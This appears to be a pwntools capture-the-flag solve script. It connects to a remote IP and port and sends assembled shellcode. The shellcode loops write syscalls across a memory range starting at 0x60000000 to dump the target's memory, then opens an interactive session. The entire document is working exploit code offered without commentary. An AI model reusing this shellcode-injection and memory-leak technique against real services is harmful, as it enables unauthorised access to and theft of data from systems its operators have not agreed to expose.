from pwn import *
p = remote("209.97.131.64",30214)

#pid = gdb.attach(p,gdbscript="")

sc = asm("""
    mov eax, 0x4
    mov ebx, 0x1
    mov ecx, 0x60000000
    mov edx, 0x24
    xor edi, edi
    L1:
        
        mov eax, 0x4
        int 0x80
        add ecx,0x10000
        inc edi
        cmp edi, 0x1f00
        jne L1
    
    leave
    ret

""",
arch='amd64',
os ='linux'
)

p.send(sc)

p.interactive()